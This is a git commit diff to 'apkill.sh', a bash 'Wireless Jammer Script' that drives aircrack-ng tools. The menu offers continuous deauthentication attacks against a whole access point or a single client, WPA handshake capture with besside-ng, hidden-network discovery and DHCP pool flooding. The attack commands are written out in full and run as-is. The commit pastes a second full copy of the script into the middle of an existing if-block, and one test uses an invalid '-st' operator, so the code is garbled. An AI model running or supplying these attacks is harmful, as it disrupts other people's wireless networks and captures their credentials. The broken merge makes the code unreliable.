04372d409e16027b59d86b8d8bfa4faa0163a301
deadport <35874951+deadport@users.noreply.github.com>
2018-11-28 07:55:34 +0100

    Update apkill.sh

--- apkill.sh
+++ apkill.sh
@@ -128,6 +128,139 @@ if [ $ask -eq 3 ]
 		echo "	"
 		if [ -f 'temp.txt' ]
 			then
+#!/bin/bash
+# https://github.com/deadport/apkill
+# Warning: this is noob scripting, tipps on how things can be done better are welcome, thanks.
+# Dependencies: net-tools, egrep, aircrack-ng, macchanger
+
+#dependency check 
+chan=0
+if [ ! -d '/etc/apt' ]
+	then
+		echo "WARNING:You appear to not be using a debianesque System! Please review the script to change the needed bits." && sleep 20
+fi
+echo "checking for dependencies.. please wait"
+if [ ! -f '/usr/bin/aircrack-ng' ]
+	then
+		echo "loading aircrack.."
+		sudo apt install aircrack-ng -y > /dev/null
+fi
+if [ ! -f '/bin/egrep' ]
+	then
+		echo "loading egrep.."
+		sudo apt install egrep -y > /dev/null
+fi
+if [ ! -f '/sbin/iwlist' ]
+	then
+		echo "loading net-tools.."
+		sudo apt install net-tools -y > /dev/null
+fi
+if [ ! -d '/etc/macchanger' ]
+	then
+		echo "loading macchanger.."
+		sudo apt install macchanger -y
+fi
+echo "dependency check done.." && clear
+#end of dependencie check 
+clear
+#artwork
+tput setaf 1
+echo "        / /\                /\ \       /\_\            /\ \       _\ \          _\ \   " 
+echo "       / /  \              /  \ \     / / /  _         \ \ \     /\__ \        /\__ \  "
+echo "      / / /\ \            / /\ \ \   / / /  /\_\       /\ \_\   / /_ \_\      / /_ \_\ "
+echo "     / / /\ \ \          / / /\ \_\ / / /__/ / /      / /\/_/  / / /\/_/     / / /\/_/ "
+echo "    / / /  \ \ \        / / /_/ / // /\_____/ /      / / /    / / /         / / /      "
+echo "   / / /___/ /\ \      / / /__\/ // /\_______/      / / /    / / /         / / /       "
+echo "  / / /_____/ /\ \    / / /_____// / /\ \ \        / / /    / / / ____    / / / ____   "
+echo " / /_________/\ \ \  / / /      / / /  \ \ \   ___/ / /__  / /_/_/ ___/\ / /_/_/ ___/\ "
+echo "/ / /_       __\ \_\/ / /      / / /    \ \ \ /\__\/_/___\/_______/\__\//_______/\__\/ "
+echo "\_\___\     /____/_/\/_/       \/_/      \_\_\\/_________/\_______\/    \_______\/     "
+echo "		The Wireless Jammer Script for debianesque systems	"
+echo "								                                        "
+tput sgr0
+#artwork end
+#opt
+echo "     		 	Choose an attack option:							"
+echo "	[single client(1) whole AP(2) find hidden(3) get handshakes(4)	]"
+echo "	[DHCP pool flooding attack (5)					]"
+echo "	"
+echo "	"
+echo "	"
+echo "Choose [1-5]:" && read ask
+if [ $ask -gt 5 ] || [ $ask -lt 1 ]
+	then
+		tput setaf 1
+		echo "This option does not exist!"
+		tput sgr0
+		exit 1
+fi
+#opt end
+#read interface
+iwconfig
+echo "Interface name(e.g. wlan0):"
+read inter
+if [ $ask -st 5 ]
+	then
+		echo "Interface name in Monitor Mode?:"
+		read monitor
+fi
+clear
+#read interface end
+#main
+if [ $ask -eq 2 ] || [ $ask -eq 1 ]
+	then
+		echo "scanning networks.."
+		sudo iwlist $inter scan | egrep 'Address|ESSID|Channel|Quality'
+		echo "Choose Channel:"
+		read chan
+		echo "Please wait.. monitor mode is being enabled.."
+		trap 'tput setaf 1 && echo "deactivating monitor mode.." && airmon-ng stop $monitor > /dev/null && exit 1' INT
+		sudo airmon-ng start $inter $chan > /dev/null
+		echo "MAC of Access-Point:"
+		read macacc
+		echo "loading attack..."
+		tput setaf 1
+fi
+#main end
+#options
+if [ $ask -eq 2 ]
+	then
+		sudo aireplay-ng -0 0 -a $macacc -b $macacc $monitor
+		sudo airmon-ng stop $monitor > /dev/null
+		tput sgr0
+		exit 0
+fi
+if [ $ask -eq 1 ]
+	then
+		echo "How long should be searched for Clients? [sec]:"
+		read secs
+		echo "reading clients from network.. [scanning $secs seconds]"
+		sudo timeout --kill-after=$secs --foreground $secs airodump-ng -M -U -c $chan -d $macacc $monitor
+		echo "Client MAC:"
+		read clientmac
+		tput setaf 1
+		sudo aireplay-ng -0 0 -a $macacc -c $clientmac $monitor
+		sudo airmon-ng stop $monitor > /dev/null
+		tput sgr0
+		exit 0
+fi
+if [ $ask -eq 3 ]
+	then
+		echo "How long to scan? [sec]:"
+		read secs
+		tput setaf 1
+		echo "scanning.. [$secs sec]"
+		sleep 2
+		sudo airmon-ng start $inter > /dev/null && echo "enabling monitor mode.."
+		sleep 2
+		sudo timeout --kill-after=$secs --foreground $secs airodump-ng $monitor &>> temp.txt
+		clear
+		tput sgr0
+		echo "Hidden APs are:"
+		echo "evaluating scan..." && cat temp.txt | grep length | uniq --check-chars=18
+		echo "	"
+		if [ -f 'temp.txt' ]
+			then
 				echo "scan successfull"
 			else
 				echo "scan error"
@@ -155,7 +288,7 @@ if [ $ask -eq 4 ]
 				trap 'tput setaf 1 && echo "deactivating monitor mode.." && airmon-ng stop $monitor > /dev/null && exit 1' INT
 				sudo besside-ng $monitor
 				tput sgr0
-		else
+			else
 				tput setaf 1
 				sudo iwlist $inter scan | egrep 'Address|ESSID|Channel|Quality'
 				echo "choose AP MAC:"
@@ -171,8 +304,6 @@ if [ $ask -eq 4 ]
 fi
 if [ $ask -eq 5 ]
 	then 
-		pass=0
-		essid=0
 		online=1
 		echo "To successfully perform this attack you must be connected to the destination AP!"
 		echo "Your Hostname is:"
@@ -193,7 +324,7 @@ if [ $ask -eq 5 ]
 				sudo dhclient $inter
 				sleep 2
 				#check online start 
-				ping $gate -c 1 > /dev/null
+				ping -c 1 $gate > /dev/null
 				if [ $? -eq 1 ]
 					then
 						online=0
